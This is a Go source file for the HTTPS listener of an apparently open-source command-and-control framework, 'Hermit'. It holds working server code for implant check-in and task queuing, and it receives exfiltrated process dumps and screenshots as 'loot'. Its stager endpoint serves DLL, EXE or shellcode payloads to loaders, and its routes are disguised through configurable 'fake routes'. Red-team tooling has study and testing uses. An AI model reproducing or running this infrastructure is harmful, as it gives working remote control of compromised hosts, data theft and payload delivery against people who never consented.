package service

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"

	"github.com/hideckies/hermit/pkg/common/certs"
	"github.com/hideckies/hermit/pkg/common/crypt"
	"github.com/hideckies/hermit/pkg/common/meta"
	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/agent"
	"github.com/hideckies/hermit/pkg/server/db"
	"github.com/hideckies/hermit/pkg/server/job"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
	_task "github.com/hideckies/hermit/pkg/server/task"
)

var upgrader = websocket.Upgrader{}

type CheckInData struct {
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Hostname    string `json:"hostname"`
	ListenerURL string `json:"listenerURL"`
	ImplantType string `json:"implantType"`
	Sleep       uint   `json:"sleep"`
	Jitter      uint   `json:"jitter"`
	KillDate    uint   `json:"killDate"`
}

type StagerData struct {
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	Hostname   string `json:"hostname"`
	LoaderType string `json:"loaderType"`
}

type SocketData struct {
}

// This function is used for verifying the connected agent.
func verifyAgentCheckIn(ag *agent.Agent, ip string, os string, arch string, hostname string) bool {
	if ag.Ip == ip && ag.OS == os && ag.Arch == arch && ag.Hostname == hostname {
		return true
	} else {
		return false
	}
}

func handleImplantCheckIn(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var checkInData CheckInData
		if err := json.Unmarshal(jsonBytes, &checkInData); err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get check-in date
		checkInDate := meta.GetCurrentDateTime()

		// Check if the agent already exists on the database.
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if verifyAgentCheckIn(ag, clientIP, checkInData.OS, checkInData.Arch, checkInData.Hostname) {
				targetAgent = ag
				break
			}
		}

		if targetAgent == nil {
			// Add new agent to the database
			targetAgent = agent.NewAgent(
				0,
				uuid.NewString(),
				"",
				clientIP,
				checkInData.OS,
				checkInData.Arch,
				checkInData.Hostname,
				checkInData.ListenerURL,
				checkInData.ImplantType,
				checkInDate,
				checkInData.Sleep,
				checkInData.Jitter,
				checkInData.KillDate,
			)
			if err := database.AgentAdd(targetAgent); err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
		} else {
			// Update the agent info
			targetAgent.Hostname = checkInData.Hostname
			targetAgent.CheckInDate = checkInDate
			if err := database.AgentUpdate(targetAgent); err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
		}

		// Make the agent directory and others
		err = metafs.MakeAgentChildDirs(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		ctx.String(http.StatusOK, targetAgent.Uuid)
	}
	return gin.HandlerFunc(fn)
}

func handleImplantDownload(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		// Check if the agent exists on the database
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		agentExists := false
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				agentExists = true
				break
			}
		}
		if !agentExists {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read the request data (file path to download)
		filenameBytes, err := ctx.GetRawData()
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}
		filename := string(filenameBytes)

		// Prepare the file
		data, err := os.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}
		// Encrypt the data
		dataEnc := crypt.EncryptData(data)

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(dataEnc)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to get all agents.")
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "Error: The agent UUID not found.")
			return
		}

		// Get tasks
		tasks, err := metafs.ReadAgentTasks(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to read a task.")
			return
		}
		if len(tasks) == 0 {
			ctx.String(http.StatusBadRequest, "Tasks are not set.")
			return
		}
		// Get the first task and remove it from task list
		currTask := tasks[0]
		err = metafs.DeleteAgentTask(targetAgent.Name, currTask, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to delete a task from file.")
			return
		}

		// Encrypt the task
		encTask := crypt.Encrypt(currTask)

		ctx.String(http.StatusOK, encTask)
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get task
		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
		// Decrypt
		task, err := crypt.Decrypt(taskEnc)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
			return
		}
		// Parse JSON
		var taskJSON _task.Task
		json.Unmarshal([]byte(task), &taskJSON)

		// Get result data (encrypted).
		dataEnc, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to get the task result.")
			return
		}
		// Decrypt task result.
		dataDecStr, err := crypt.Decrypt(string(dataEnc))
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to decrypt the task result.")
			return
		}

		// Parse JSON
		var taskResult _task.TaskResult
		if dataDecStr != "" {
			if err := json.Unmarshal([]byte(dataDecStr), &taskResult); err != nil {
				ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
				return
			}
		}

		content := ""
		switch taskJSON.Command.Code {
		case _task.TASK_CONNECT:
			// Update listener URL of the agent on the database.
			targetAgent.ListenerURL = taskResult.Result
			database.AgentUpdate(targetAgent)

			content = "Listener URL has been updated."
		case _task.TASK_DOWNLOAD:
			downloadPath := taskResult.Result
			content = fmt.Sprintf("Downloaded at %s", downloadPath)
		case _task.TASK_JITTER:
			timeStr := taskJSON.Args["time"]
			time, err := strconv.ParseUint(timeStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update jitter time on the database
			targetAgent.Jitter = uint(time)
			err = database.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The jitter time has been updated."
		case _task.TASK_KILLDATE:
			dtStr := taskJSON.Args["datetime"]
			dt, err := strconv.ParseUint(dtStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update killdate on the database
			targetAgent.KillDate = uint(dt)
			err = database.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The killdate has been updated."
		case _task.TASK_PROCDUMP:
			agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
				return
			}
			content = fmt.Sprintf("Saved file under %s/procdumps", agLootDir)
		case _task.TASK_SCREENSHOT:
			agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
				return
			}
			content = fmt.Sprintf("Saved file under %s/screenshots", agLootDir)
		case _task.TASK_SLEEP:
			timeStr := taskJSON.Args["time"]
			time, err := strconv.ParseUint(timeStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update sleep time on the database
			targetAgent.Sleep = uint(time)
			err = database.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The sleep time has been updated."
		case _task.TASK_UPLOAD:
			uploadPath := taskResult.Result
			content = fmt.Sprintf("Uploaded at %s", uploadPath)
		default:
			content = taskResult.Result
		}

		// Write the task result to a file.
		taskName, err := taskResult.Task.Encode()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		_, err = metafs.WriteAgentLoot(targetAgent.Name, taskName, content, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		ctx.String(http.StatusOK, "OK")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantUpload(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get the client UUID
		clientUUID := ctx.GetHeader("X-UUID")

		// Get the agent
		ags, err := database.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == clientUUID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get file data (encrypted)
		dataEnc, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		// Decrypt
		data, err := crypt.DecryptData(dataEnc)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get task
		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
		// Decrypt
		task, err := crypt.Decrypt(taskEnc)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
			return
		}
		// Parse JSON
		var taskJSON _task.Task
		json.Unmarshal([]byte(task), &taskJSON)

		if taskJSON.Command.Code == _task.TASK_DOWNLOAD {
			// Get the download path
			downloadPath := ctx.GetHeader("X-File")
			// Check if the file already exists
			if _, err := os.Stat(downloadPath); err == nil {
				ctx.String(http.StatusBadRequest, "File already exists.")
				return
			}

			// Save the file
			err = os.WriteFile(downloadPath, data, 0644)
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else if taskJSON.Command.Code == _task.TASK_PROCDUMP {
			// Save file
			_, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, fmt.Sprintf("procdump %s", taskJSON.Args["pid"]))
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else if taskJSON.Command.Code == _task.TASK_SCREENSHOT {
			// Save file
			_, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, "screenshot")
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else {
			ctx.String(http.StatusBadRequest, "Invalid task command.")
			return
		}

		ctx.String(http.StatusOK, "Uploaded successfully.")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantWebSocket(ctx *gin.Context) {
	stdout.LogSuccess(fmt.Sprintf("Received from %s on WebSocket\n", ctx.ClientIP()))
	w, r := ctx.Writer, ctx.Request
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		stdout.LogInfo(fmt.Sprint(err))
		return
	}
	defer c.Close()
	for {
		mt, message, err := c.ReadMessage()
		if err != nil {
			stdout.LogInfo(fmt.Sprint(err))
			break
		}
		stdout.LogSuccess(fmt.Sprintf("received: %s", message))
		err = c.WriteMessage(mt, message)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			break
		}
	}
}

func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var stgData StagerData
		if err := json.Unmarshal(jsonBytes, &stgData); err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get all payload paths generated under '~/.hermit/server/listeners/<listner>/payloads'.
		payloadPaths, err := metafs.GetListenerPayloadPaths(lis.Name, false, false)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		targetPayloadPath := ""
		for _, payloadPath := range payloadPaths {
			// TODO: more accurate check for file info

			if stgData.OS == "linux" {
				// TODO
				// ...
			}
			if stgData.OS == "windows" {
				if stgData.LoaderType == "dll-loader" {
					// Load a DLL file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".amd64.dll") {
							targetPayloadPath = payloadPath
							break
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".i686.dll") {
							targetPayloadPath = payloadPath
							break
						}
					}
				} else if stgData.LoaderType == "exec-loader" {
					// Load an executable file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".amd64.exe") {
							targetPayloadPath = payloadPath
							break
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".i686.exe") {
							targetPayloadPath = payloadPath
							break
						}
					}
				} else if stgData.LoaderType == "shellcode-loader" {
					// Load a shellcode (raw) file.
					if stgData.Arch == "amd64" {
						if strings.HasSuffix(payloadPath, ".x64.bin") {
							targetPayloadPath = payloadPath
						}
					} else if stgData.Arch == "i686" {
						if strings.HasSuffix(payloadPath, ".x86.bin") {
							targetPayloadPath = payloadPath
						}
					}
					if strings.HasSuffix(payloadPath, ".bin") {
						targetPayloadPath = payloadPath
						break
					}
				}
			}
		}
		if targetPayloadPath == "" {
			// TODO: If there are not target payloads, set default paylaod.
			// ...
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Read data from the payload.
		data, err := os.ReadFile(targetPayloadPath)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(data)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func handleSocketOpen(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		return
	}
	return gin.HandlerFunc(fn)
}

func handleSocketClose(database *db.Database) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		return
	}
	return gin.HandlerFunc(fn)
}

func httpsRoutes(
	router *gin.Engine,
	lis *listener.Listener,
	serverState *state.ServerState,
) {
	fakeRoutes := serverState.Conf.Listener.FakeRoutes

	for _, r := range fakeRoutes["/implant/checkin"] {
		router.POST(r, handleImplantCheckIn(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/download"] {
		router.POST(r, handleImplantDownload(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/task/get"] {
		router.GET(r, handleImplantTaskGet(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/task/result"] {
		router.POST(r, handleImplantTaskResult(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/upload"] {
		router.POST(r, handleImplantUpload(serverState.DB))
	}
	for _, r := range fakeRoutes["/implant/websocket"] {
		router.GET(r, handleImplantWebSocket)
	}
	for _, r := range fakeRoutes["/stager/download"] {
		router.POST(r, handleStagerDownload(lis))
	}
	for _, r := range fakeRoutes["/socket/open"] {
		router.POST(r, handleSocketOpen(serverState.DB))
	}
	for _, r := range fakeRoutes["/socket/close"] {
		router.POST(r, handleSocketClose(serverState.DB))
	}
}

func HttpsStart(
	lis *listener.Listener,
	lisJob *job.ListenerJob,
	serverState *state.ServerState,
) error {
	// Get server certificate paths
	serverCertPath, serverKeyPath, err := certs.GetCertificatePath(
		certs.CATYPE_HTTPS,
		false,
		false,
		lis.Name,
	)
	if err != nil {
		return err
	}

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.HandleMethodNotAllowed = false
	router.Use(gin.Recovery())

	httpsRoutes(router, lis, serverState)

	srv := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", lis.Addr, lis.Port),
		Handler: router,
	}

	go func() {
		for {
			select {
			case uuid := <-lisJob.ChReqQuit:
				if err := srv.Close(); err != nil {
					lisJob.ChError <- uuid
				}
			default:
			}
		}
	}()

	lisJob.ChReady <- lis.Uuid

	if err := srv.ListenAndServeTLS(serverCertPath, serverKeyPath); err != nil {
		if err == http.ErrServerClosed {
			lisJob.ChQuit <- lis.Uuid
			return nil
		} else {
			stdout.LogInfo("srv.ListenAndServeTLS else")
			return err
		}
	}

	return nil
}
